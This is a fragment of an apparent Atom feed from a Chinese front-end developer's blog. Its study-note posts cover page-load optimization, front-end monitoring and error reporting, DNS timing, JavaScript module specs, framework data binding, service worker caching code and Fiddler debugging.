<p>加载策略&lt;提高用户体验&gt;<br>·先加载小图onload之后再加载交错大图<br>·懒加载<br>·尽量减少http请求,合理的使用雪碧图和base64编码的图片</p>
<p>CssSprites:页面风格多变,经常换肤；无需重复图形内容；不会增加css文件体积<br>Base64:极小极简单图片，可复用,适用小图标（缺点：css文件体积增大,导致解析时间变长）</p>
<h1 id="其他资源的优化"><a href="#其他资源的优化" class="headerlink" title="其他资源的优化"></a>其他资源的优化</h1><p>也适用于图片</p>
<p>·懒加载：图片；组件，模块<br>·预加载：提前加载下一页；异步加载，提前发送数据请求加载数据资源<br>·减小传输体积——压缩；减少传输数量——打包<br>·打包分块，资源复用<br>·加快速度——静态资源放CDN<br>·网速，服务器响应,CDN</p>
<h1 id="提高首页-加载速度"><a href="#提高首页-加载速度" class="headerlink" title="提高首页/加载速度"></a>提高首页/加载速度</h1><p>·雪碧图<br>·js放底部，css放头部<br>·减少DOM数量<br>·script标签设置异步加载async<br>·减少DNS查找,允许高度并行下载;<br>·减少http请求<br>·设置http头部缓存字段expires,E-tag,last-modified；减少/不使用cookie</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;优化哪些方面&quot;&gt;&lt;a href=&quot;#优化哪些方面&quot; class=&quot;headerlink&quot; title=&quot;优化哪些方面&quot;&gt;&lt;/a&gt;优化哪些方面&lt;/h1&gt;&lt;p&gt;加载速度&lt;br&gt;呈现效果&lt;/p&gt;
&lt;h1 id=&quot;图片的优化&quot;&gt;&lt;a href=&quot;#图片的优化&quot; class
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于监控</title>
    <link href="http://yoohannah.github.io/post/knowledge/monitor.html"/>
    <id>http://yoohannah.github.io/post/knowledge/monitor.html</id>
    <published>2018-03-19T01:43:37.000Z</published>
    <updated>2018-03-20T15:59:21.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么要做监控"><a href="#为什么要做监控" class="headerlink" title="为什么要做监控"></a>为什么要做监控</h1><p>对自己的网站做到错误提前预知和排查<br>统计自己的网站相关数据,对网站进行优化</p>
<h1 id="监控什么"><a href="#监控什么" class="headerlink" title="监控什么"></a>监控什么</h1><p>业务数据：<br>PV(PAGE VIEW,页面浏览量,一个用户打开了网站的几个页面)<br>UV(unique visitor,访问某个站点或点击某条新闻的不同IP地址的人数)<br>点击率<br>转化率(浏览人数与注册人数之间的比率)<br>跳出率(浏览与离开/不喜欢的人数之间的比率)</p>
<p>稳定性：<br>所提供服务是否稳定，能否得知偏远地区数据稳定性<br>网络挂断情况能否立即得知,而不是通过用户告知<br>异地双活(A地的机器中断工作,通过切换其他地方的机器来提供服务)</p>
<p>性能：<br>首屏打开的性能<br>……</p>
<p>错误：<br>用户端的错误上报</p>
<p>用户操作路径：<br>操作流程,方便跟踪错误</p>
<h1 id="怎么进行监控"><a href="#怎么进行监控" class="headerlink" title="怎么进行监控"></a>怎么进行监控</h1><p>根据监控的对象/内容将监控的数据进行上报,然后根据上报寻找异常</p>
<p>PV/UV,业务操作的上报；<br>将页面性能数据进行上报; ======&gt;huatuo<br>将页面产生的错误上报；========&gt;badjs<br>跟踪用户操作,将操作路径/流程上报;<br>接口请求成功与否的上报<br>用户数据的上报</p>
<p>一般的上报方案是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = new Image</div><div class="line">img.src = `$&#123;url&#125;`</div><div class="line">//url是上报的接口,上报的数据随接口给到后台</div></pre></td></tr></table></figure></p>
<p>1.上报不需要返回值,Image请求不会返回值<br>2.可以自动跨域,拿不到返回值，上报也不需要确定是否上报成功</p>
<p>服务端拿到接口传过来的数据，将数据写到log文件中，<br>在需要时进行搜索统计，或者在定时/计划任务时进行查询</p>
<p><a href="http://www.cnblogs.com/longjshz/p/5805903.html" target="_blank" rel="external">使用grep命令进行查找</a></p>
<h1 id="上报"><a href="#上报" class="headerlink" title="上报"></a>上报</h1><h2 id="业务数据上报"><a href="#业务数据上报" class="headerlink" title="业务数据上报"></a>业务数据上报</h2><h3 id="人工标上报点"><a href="#人工标上报点" class="headerlink" title="人工标上报点"></a>人工标上报点</h3><p>对onclick等触发事件手动帮上上报函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">function report(data)&#123;</div><div class="line">var url = &apos;....&apos;+data</div><div class="line">	var img = new Image</div><div class="line">  img.src = `$&#123;url&#125;`</div><div class="line">&#125; </div><div class="line">dom.addEventListener(&quot;click&quot;, report);</div></pre></td></tr></table></figure></p>
<h3 id="点击截获上报"><a href="#点击截获上报" class="headerlink" title="点击截获上报"></a>点击截获上报</h3><p>通过事件冒泡和DOM上的标记找到对应行动点,获取具体操作对象DOM进行上报</p>
<h3 id="百度统计-google-analytics"><a href="#百度统计-google-analytics" class="headerlink" title="百度统计/google analytics"></a>百度统计/google analytics</h3><p>通过发送带上COOKIE的Image请求来定位用户与站点信息,对整个页面做定位</p>
<p>若用户把cookie清除了怎么办？<br>1.尝试让用户啊登录<br>2.百度、谷歌一般有多个登录态，可以给没有cookie的用户先注册个临时ID，等登录后再映射回来<br>3.浏览器终端机器本身可以产生一些类似mac地址的唯一识别码的东西，根据识别码进行跟踪，<br>或者使用指纹采集，fingerprint.js等手段为用户生成指纹进行跟踪</p>
<h3 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h3><p>将log数据线存储的本地IndexDB等地方，必要时服务器发起收集;<br>基于DSL的切面事件(before,after)，将监控事件可以自动注入，这样实现配置平台让产品也可以自定义上报</p>
<p><a href="https://www.cnblogs.com/Wolfmanlq/p/6036019.html" target="_blank" rel="external">轻松理解AOP思想(面向切面编程)</a></p>
<h3 id="如何利用业务数据"><a href="#如何利用业务数据" class="headerlink" title="如何利用业务数据"></a>如何利用业务数据</h3><p>查看统计业务情况<br>检查系统稳定性<br>错误如何产生<br>是否被非法套嵌<br>检测性能优化程度</p>
<h2 id="性能数据上报"><a href="#性能数据上报" class="headerlink" title="性能数据上报"></a>性能数据上报</h2><p>查看真实用户页面打开情况<br>通过时间这个维度去看</p>
<h3 id="打点上报"><a href="#打点上报" class="headerlink" title="打点上报"></a>打点上报</h3><p>在指定位置标记一些时间点标识，然后进行统计</p>
<h3 id="利用permance-timing"><a href="#利用permance-timing" class="headerlink" title="利用permance.timing"></a>利用permance.timing</h3><p><a href="https://yoohannah.github.io/post/knowledge/Performance.html">关于Performance API</a></p>
<h3 id="如何利用性能数据"><a href="#如何利用性能数据" class="headerlink" title="如何利用性能数据"></a>如何利用性能数据</h3><p>用户真实数据，如白屏时间，从产品/经验值看是否能接收，是否需要优化<br>对于某些地区的响应慢，是不是网络问题，是否推动网络或CDN优化<br>验证性能优化效果<br>找到一个参考值，通过流程化的方式让未来我们的项目都能达到一个基准线</p>
<h2 id="稳定性监控"><a href="#稳定性监控" class="headerlink" title="稳定性监控"></a>稳定性监控</h2><p>主要靠后端，前端做辅助</p>
<h2 id="错误上报-bad-js"><a href="#错误上报-bad-js" class="headerlink" title="错误上报(bad.js)"></a>错误上报(bad.js)</h2><h3 id="为什么要上报"><a href="#为什么要上报" class="headerlink" title="为什么要上报"></a>为什么要上报</h3><p>防止出现问题时，能不能及时得知，方不方便排查<br>偏远地区CDN出现故障，导致页面空白<br>边界条件未验证导致错误<br>后台返回结果不符合预期导致错误<br>用户产生了不可预知的操作</p>
<h3 id="怎么捕获"><a href="#怎么捕获" class="headerlink" title="怎么捕获"></a>怎么捕获</h3><p>使用window.error捕获错误，可以将将msg,url,row行,col列，error错误等信息拿到<br>但以上信息不能确定是那个文件出了错误，<br>在firefox,chrome中的堆栈信息中可以根据上面的error找到是哪个文件出了错误<br>所以在上报之前根据堆栈信息找到文件再上报</p>
<h3 id="script-error"><a href="#script-error" class="headerlink" title="script error"></a>script error</h3><p>一般是文件跨域出现的错误<br>出现的场景和条件如下<br>通过window.onerror注册监听脚本错误事件<br>浏览器是firefox,chrome,safari,ie7+<br>页面内使用script标签引入非同域资源，且发生脚本错误<br>解决<br>1.设置cors<br>将跨域资源的response header的Access-Control-Allow-Origin设置为<em>或者本域，<br>(一般设为</em>，因为防止第三个域也来请求该文件时，本域请求完，response header有缓存，导致第三个域资源无法使用)<br>然后在script标签添加属性 crossorigin<br>2.对入口和异步方法全部用try-catch包裹，做到任何时刻错误都能捕获<br> setTimeout setInterval<br> 事件绑定<br> ajax callback<br> define require<br> 业务主入口<br><img src="/image/monitor.png" alt="monitor"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;为什么要做监控&quot;&gt;&lt;a href=&quot;#为什么要做监控&quot; class=&quot;headerlink&quot; title=&quot;为什么要做监控&quot;&gt;&lt;/a&gt;为什么要做监控&lt;/h1&gt;&lt;p&gt;对自己的网站做到错误提前预知和排查&lt;br&gt;统计自己的网站相关数据,对网站进行优化&lt;/p&gt;
&lt;h1 i
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>计算dns时间</title>
    <link href="http://yoohannah.github.io/post/knowledge/dnstime.html"/>
    <id>http://yoohannah.github.io/post/knowledge/dnstime.html</id>
    <published>2018-03-17T03:42:37.000Z</published>
    <updated>2018-03-17T03:50:52.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算dns时间"><a href="#计算dns时间" class="headerlink" title="计算dns时间"></a>计算dns时间</h1><h2 id="H5之前-facebook提出的多普勒测速"><a href="#H5之前-facebook提出的多普勒测速" class="headerlink" title="H5之前 facebook提出的多普勒测速"></a>H5之前 facebook提出的多普勒测速</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">t1  http://a-doppler.facebook.com/test_pixel?HTTP1.0&amp;t=1&amp;size=0k</div><div class="line">t2  http://a-doppler.facebook.com/test_pixel?HTTP1.1&amp;t=2&amp;size=0k</div><div class="line">t3  http://a-doppler.facebook.com/test_pixel?HTTP1.1&amp;t=3&amp;size=0k</div><div class="line">t4  http://a-doppler.facebook.com/test_pixel?HTTP1.1&amp;t=4&amp;size=10k</div><div class="line"></div><div class="line">t1 = DNS + TCP/IP +RTT</div><div class="line">t2 = TCP/IP + RTT</div><div class="line">t3 = RTT</div><div class="line">10k /(t4–t3)~TCP bandwidth</div></pre></td></tr></table></figure>
<p>第一次请求使用HTTP1.0请求,保证后面的第二次请求可以重新建立TCP/IP链接<br>因为进行过第一请求，DNS已经在浏览器有缓存，所以进行第二次请求时直接在浏览器查找<br>所以t2-t1就是DNS查询时间</p>
<p>DNS = t1-t2;</p>
<p>第三次请求在第二次请求已经建立TCP/IP的情况下发起，所以</p>
<p>TCP/IP = t2-t3;</p>
<p>第四次请求只是在第三次基础上新增请求资源大小，利用这个大小，可以计算出大致贷款</p>
<p>bandwidth = 10k/(t4-t3)</p>
<h2 id="H5之后-performance-timing"><a href="#H5之后-performance-timing" class="headerlink" title="H5之后 performance.timing"></a>H5之后 performance.timing</h2><p>var time = window.performance.timing<br>DNStime = time.domainLookupEnd - time.domainLookupStart;</p>
<p>目前safari浏览器移动端均不支持,移动端Android不支持<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceTiming" target="_blank" rel="external">performance.timing MDN</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;计算dns时间&quot;&gt;&lt;a href=&quot;#计算dns时间&quot; class=&quot;headerlink&quot; title=&quot;计算dns时间&quot;&gt;&lt;/a&gt;计算dns时间&lt;/h1&gt;&lt;h2 id=&quot;H5之前-facebook提出的多普勒测速&quot;&gt;&lt;a href=&quot;#H5之前-faceboo
    
    </summary>
    
    
      <category term="html" scheme="http://yoohannah.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>为什么尽量将js放页面底部</title>
    <link href="http://yoohannah.github.io/post/knowledge/putjs.html"/>
    <id>http://yoohannah.github.io/post/knowledge/putjs.html</id>
    <published>2018-03-17T03:35:37.000Z</published>
    <updated>2018-03-17T03:35:49.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么尽量将js放页面底部"><a href="#为什么尽量将js放页面底部" class="headerlink" title="为什么尽量将js放页面底部"></a>为什么尽量将js放页面底部</h1><p>1,js是单线程的，一个时间只能干一件事<br>2.浏览器是多线程的,一个时候可以并行干多件事<br>3.一个浏览器打开一个页面，就是一个js线程<br>4.浏览器的多线线程一般会有：js引擎线程，界面渲染UI线程，浏览器事件触发线程，http请求线程等<br>5.当我们打开一个页面时，浏览器渲染html文件是从上往下渲染的，<br>UI引擎会根据html文件里面图片，css等的书写先后顺序依次去download,通过http请求拿到资源即加载结束<br>但如果碰到js文件，会将js文件先加载，加载结束后通知js引擎线程去执行<br>6.一旦js文件里面需要请求大量数据或者有对页面DOM的操作，就会造成页面空白或者由于DOM还没有加载完直接报错<br>7.为避免这样的情况,所以尽量将js放页面底部</p>
<h2 id="哪些js可以不放在底部"><a href="#哪些js可以不放在底部" class="headerlink" title="哪些js可以不放在底部"></a>哪些js可以不放在底部</h2><p>1.操作在document.ready之后执行的<br>2.处理兼容性的文件，例如早期IE兼容H5新增标签的支持文件html5shiv<br>3.jquery类库，通常引用CDN地址，经压缩后不会很大，而且很大几率已被用户缓存下来</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;为什么尽量将js放页面底部&quot;&gt;&lt;a href=&quot;#为什么尽量将js放页面底部&quot; class=&quot;headerlink&quot; title=&quot;为什么尽量将js放页面底部&quot;&gt;&lt;/a&gt;为什么尽量将js放页面底部&lt;/h1&gt;&lt;p&gt;1,js是单线程的，一个时间只能干一件事&lt;br&gt;2.
    
    </summary>
    
    
      <category term="html" scheme="http://yoohannah.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>三种规范</title>
    <link href="http://yoohannah.github.io/post/knowledge/rule.html"/>
    <id>http://yoohannah.github.io/post/knowledge/rule.html</id>
    <published>2018-01-21T13:43:15.000Z</published>
    <updated>2018-01-21T13:44:41.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="common-js-规范"><a href="#common-js-规范" class="headerlink" title="common.js 规范"></a>common.js 规范</h1><p>node.js的模块编程规范，适用于服务端，不能在浏览器使用<br>涉及到四个环境变量<br>module,exports,require,global<br>同步加载<br>require()引入<br>module.exports() 输出</p>
<h1 id="AMD规范-require-js"><a href="#AMD规范-require-js" class="headerlink" title="AMD规范(require,js)"></a>AMD规范(require,js)</h1><p>依赖在服务端，异步加载<br>require([module], callback); 引入，等待所有依赖模块加载完后再执行回调函数<br>define() 输出<br>CMD规范（sea.js)</p>
<h1 id="es6规范"><a href="#es6规范" class="headerlink" title="es6规范"></a>es6规范</h1><p>使用import 引入模块<br>使用export 输出</p>
<p><a href="https://segmentfault.com/a/1190000010913832" target="_blank" rel="external">相关</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;common-js-规范&quot;&gt;&lt;a href=&quot;#common-js-规范&quot; class=&quot;headerlink&quot; title=&quot;common.js 规范&quot;&gt;&lt;/a&gt;common.js 规范&lt;/h1&gt;&lt;p&gt;node.js的模块编程规范，适用于服务端，不能在浏览器使用
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>各种框架框架的数据绑定机制</title>
    <link href="http://yoohannah.github.io/post/knowledge/render.html"/>
    <id>http://yoohannah.github.io/post/knowledge/render.html</id>
    <published>2018-01-21T13:30:15.000Z</published>
    <updated>2018-03-24T14:25:43.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="angular-js"><a href="#angular-js" class="headerlink" title="angular js"></a>angular js</h1><p>脏检查机制</p>
<h1 id="react"><a href="#react" class="headerlink" title="react"></a>react</h1><p>虚拟DOM:react 在初始化的时候会render一颗dom树，当state/props发生改变的时候，render函数会再渲染出另外一棵树与之前的dom树进行对比，新渲染的树就是虚拟dom树<br>diff 算法:比较dom树时的算法，</p>
<p>只会对同层节点进行比较；<br>父节点不同,不会再去比较子节点；</p>
<p>同层比较时，遇到结点类型不同,比如结点顺序发生变化时<br>没有key属性的时候，自己以及自己以后的结点都会被删除,重新建；删除时，会卸载删除的结点以及以后的结点，再新建以后的结点<br>如果有key的话，则只会新增插入的结点，卸载被替换的结点 其他结点则只是update,不受影响；删除的话，只卸载删除的结点</p>
<p>遇到结点类型相同，<br>要去比较属性是否相同，如果不同，则只替换属性,只进行update</p>
<p>性能优化：避免不必要渲染<br>使用shouldComponentUpdate(),当这个方法返回true的时候，需要重新渲染，false的时候不需要（默认是true).<br>使用PureComponent组件，它会自动浅对比props/state，当两者相同的时候不渲染节点。<br>PureComponent只会浅比较，所以不适合用于深层嵌套的对象。<br>同时，PureComponent不仅仅会跳过自己的重新渲染，还会跳过它所有子节点的，所以要注意，用它的时候是最好没有子节点并且不依赖于global state的展示型组件。<br><img src="/image/reactlife.png" alt="reactlife"></p>
<h1 id="vue1-0"><a href="#vue1-0" class="headerlink" title="vue1.0"></a>vue1.0</h1><p>单检查</p>
<h1 id="vue2-0"><a href="#vue2-0" class="headerlink" title="vue2.0"></a>vue2.0</h1><p>虚拟DOM和diff算法</p>
<p><img src="/image/vuelife.png" alt="vuelife"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;angular-js&quot;&gt;&lt;a href=&quot;#angular-js&quot; class=&quot;headerlink&quot; title=&quot;angular js&quot;&gt;&lt;/a&gt;angular js&lt;/h1&gt;&lt;p&gt;脏检查机制&lt;/p&gt;
&lt;h1 id=&quot;react&quot;&gt;&lt;a href=&quot;#rea
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>模板引擎前后端优缺点</title>
    <link href="http://yoohannah.github.io/post/knowledge/template.html"/>
    <id>http://yoohannah.github.io/post/knowledge/template.html</id>
    <published>2018-01-04T15:03:15.000Z</published>
    <updated>2018-01-04T15:08:05.324Z</updated>
    
    <content type="html"><![CDATA[<p>模板引擎在后端<br>优点<br>在第一次请求时不需要发送请求数据的的HTTP，加载速度可能会快一些；<br>利于SEO;</p>
<p>缺点<br>前端模板有改动，后端对应的模板页面也要改动；<br>如果页面有复杂JS，前端因为没有数据不方便调试，后端需要使用js进行修改；<br>服务器负载压力大</p>
<p>模板引擎在前端<br>优点<br>前后端分离，后台只需要处理逻辑业务,提供接口，减少服务端压力;<br>前端修改方便；<br>可跨平台，兼容不同后端技术</p>
<p>缺点<br>不利于SEO（搜索引擎无法抓取页面的数据，因为只是模板，没有数据内容）<br>JS有可能被用户禁用，数据安全性低</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;模板引擎在后端&lt;br&gt;优点&lt;br&gt;在第一次请求时不需要发送请求数据的的HTTP，加载速度可能会快一些；&lt;br&gt;利于SEO;&lt;/p&gt;
&lt;p&gt;缺点&lt;br&gt;前端模板有改动，后端对应的模板页面也要改动；&lt;br&gt;如果页面有复杂JS，前端因为没有数据不方便调试，后端需要使用js进行修改
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>ng-src</title>
    <link href="http://yoohannah.github.io/post/knowledge/ngsrc.html"/>
    <id>http://yoohannah.github.io/post/knowledge/ngsrc.html</id>
    <published>2018-01-04T14:47:15.000Z</published>
    <updated>2018-01-04T15:00:23.385Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ng-src"><a href="#ng-src" class="headerlink" title="ng-src"></a>ng-src</h1><p>img 里面使用src=”{ { } }“会在页面一开始加载模板的时候，不会执行{ { } }，直接去请求资源，造成404错误<br>如果使用ng-src = “{ { } }“就会避免以上问题，ng-src会先去执行{ { } },得到资源地址后再去请求资源<br>ng-src 指令确保的 AngularJS 代码执行前不显示图片。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ng-src&quot;&gt;&lt;a href=&quot;#ng-src&quot; class=&quot;headerlink&quot; title=&quot;ng-src&quot;&gt;&lt;/a&gt;ng-src&lt;/h1&gt;&lt;p&gt;img 里面使用src=”{ { } }“会在页面一开始加载模板的时候，不会执行{ { } }，直接去请求资
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>service worker</title>
    <link href="http://yoohannah.github.io/post/knowledge/serviceworker.html"/>
    <id>http://yoohannah.github.io/post/knowledge/serviceworker.html</id>
    <published>2018-01-03T14:52:15.000Z</published>
    <updated>2018-01-03T14:55:28.739Z</updated>
    
    <content type="html"><![CDATA[<p>前端与后台代理服务器</p>
<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><p>fetch 事件/方法:service worker向后台发起HTTP请求的方法<br>fetch(url).then()</p>
<p>message事件/方法:页面和service worker之间进行通信的方法;同一页面两个窗口之间通信（web worker线程)<br>postMessage发送消息;message接收消息</p>
<p>caches API:处理缓存</p>
<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>注册 register<br>安装 install<br>激活 activation<br>更新 Update<br>service-worker.js文件更新被浏览器发现后，会进入waitting等待状态，当前页面依旧使用旧文件进行work，<br>直到当前页面关闭，旧版本文件的service worker才会被kill掉，新版本文件的service worker开始接管页面的缓存资源<br>新的service worker一开始接管就会触发activate事件，从而可以做一些上次老版本缓存的工作</p>
<p>缓存的文件发生更新，可以在fetch 的时候，一边检查更新从而更新缓存，一边检查缓存然后fetch新资源给浏览器，<br>通过 promise 的 resolve 特性来决定谁快</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>（https环境）<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line">//在项目入口/配置js文件 进行注册</div><div class="line">if (navigator.serviceWorker) &#123;</div><div class="line">    navigator.serviceWorker.register(&apos;service-worker.js&apos;).then(function(registration) &#123;</div><div class="line">        console.log(&apos;service worker 注册成功&apos;);</div><div class="line">    &#125;).catch(function (err) &#123;</div><div class="line">        console.log(&apos;servcie worker 注册失败&apos;)</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//service-worker.js 放在项目根目录下,service worker的执行代码</div><div class="line">var cacheFiles = [ //指定缓存的文件</div><div class="line">    &apos;about.js&apos;,</div><div class="line">    &apos;blog.js&apos;</div><div class="line">];</div><div class="line">self.addEventListener(&apos;install&apos;, function (evt) &#123; //在安装的时候就将指定文件存入cache storage中</div><div class="line">    evt.waitUntil(</div><div class="line">        caches.open(&apos;my-test-cahce-v1&apos;).then(function (cache) &#123; //使用caches api进行缓存操作</div><div class="line">            return cache.addAll(cacheFiles);</div><div class="line">        &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line">//页面fetch 资源时进行过滤</div><div class="line">self.addEventListener(&apos;fetch&apos;, function(event) &#123;</div><div class="line">  event.respondWith(</div><div class="line">    caches.match(event.request) //检查缓存是否有资源</div><div class="line">      .then(function(response) &#123;</div><div class="line">        if (response) &#123; //如果有直接返回</div><div class="line">          return response;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 因为 event.request 流已经在 caches.match 中使用过一次，</div><div class="line">        // 那么该流是不能再次使用的。我们只能得到它的副本，拿去使用。</div><div class="line">        var fetchRequest = event.request.clone();</div><div class="line"></div><div class="line">        // fetch 的通过信方式，得到 Request 对象，然后发送请求</div><div class="line">        return fetch(fetchRequest).then(</div><div class="line">          function(response) &#123;</div><div class="line">            // 检查是否成功</div><div class="line">            if(!response || response.status !== 200 || response.type !== &apos;basic&apos;) &#123;</div><div class="line">              return response;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // 如果成功，该 response 一是要拿给浏览器渲染，而是要进行缓存。</div><div class="line">            // 由于 caches.put 使用的是文件的响应流，一旦使用，</div><div class="line">            // 那么返回的 response 就无法访问造成失败，所以，这里需要复制一份。</div><div class="line">            var responseToCache = response.clone();</div><div class="line"></div><div class="line">            caches.open(CACHE_NAME)</div><div class="line">              .then(function(cache) &#123;</div><div class="line">                cache.put(event.request, responseToCache);</div><div class="line">              &#125;);</div><div class="line"></div><div class="line">            return response;</div><div class="line">          &#125;</div><div class="line">        );</div><div class="line">      &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//service-worker.js文件更新删除之前版本文件缓存的资源</div><div class="line"></div><div class="line">self.addEventListener(&apos;activate&apos;, function(event) &#123;</div><div class="line"></div><div class="line">  var cacheWhitelist = [&apos;v1&apos;];</div><div class="line"></div><div class="line">  event.waitUntil(</div><div class="line">  // 遍历 caches 里所有缓存的 keys 值</div><div class="line">    caches.keys().then(function(cacheNames) &#123;</div><div class="line">      return Promise.all(</div><div class="line">        cacheNames.map(function(cacheName) &#123;</div><div class="line">          if (cacheWhitelist.includes(cacheName)) &#123;</div><div class="line">          // 删除 v1 版本缓存的文件</div><div class="line">            return caches.delete(cacheName);</div><div class="line">          &#125;</div><div class="line">        &#125;)</div><div class="line">      );</div><div class="line">    &#125;)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000008050742" target="_blank" rel="external">相关文档</a><br><a href="https://www.villainhr.com/page/2016/09/25/%E5%89%8D%E7%AB%AF%20fetch%20%E9%80%9A%E4%BF%A1" target="_blank" rel="external">fetch 通信</a><br><a href="https://www.villainhr.com/page/2016/08/22/Web%20Worker" target="_blank" rel="external">web worker 语法</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="external">Service Worker API</a></p>
<p>遗留问题：fetch通信headers添加token字段,不生效</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前端与后台代理服务器&lt;/p&gt;
&lt;h2 id=&quot;主要方法&quot;&gt;&lt;a href=&quot;#主要方法&quot; class=&quot;headerlink&quot; title=&quot;主要方法&quot;&gt;&lt;/a&gt;主要方法&lt;/h2&gt;&lt;p&gt;fetch 事件/方法:service worker向后台发起HTTP请求的方法&lt;br&gt;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>调试</title>
    <link href="http://yoohannah.github.io/post/knowledge/fiddler.html"/>
    <id>http://yoohannah.github.io/post/knowledge/fiddler.html</id>
    <published>2018-01-03T14:47:15.000Z</published>
    <updated>2018-01-24T13:37:09.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fiddler-使用"><a href="#fiddler-使用" class="headerlink" title="fiddler 使用"></a>fiddler 使用</h1><p>浏览器向服务器发送请求的拦截器</p>
<h2 id="statistic"><a href="#statistic" class="headerlink" title="statistic"></a>statistic</h2><p>查看一次请求各阶段所发生的时间，HTTP performance<br><img src="/image/fiddler5.png" alt="fiddler5"></p>
<h1 id="Inspectors"><a href="#Inspectors" class="headerlink" title="Inspectors"></a>Inspectors</h1><p>查看报文，上半部分是request,下半部分是response<br><img src="/image/fiddler4.png" alt="fiddler4"></p>
<h2 id="AutoResponder"><a href="#AutoResponder" class="headerlink" title="AutoResponder"></a>AutoResponder</h2><p>拦截本来要发给真正服务器的指定请求,将本地资源作为response返回去<br><img src="/image/fiddler3.png" alt="fiddler3"><br>1.开启规则<br>2.添加规则<br>3.指定请求，若以EXACT：开头，要写完整的请求路径;模糊匹配的话就不要写EXACT：<br>4.指定作为response的本地路径资源地址<br>5.确认规则配置完毕</p>
<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>自己创建request 向服务器发送请求<br><img src="/image/fiddler2.png" alt="fiddler2"><br>配置好request后，点击excute按钮手动向服务器发送请求</p>
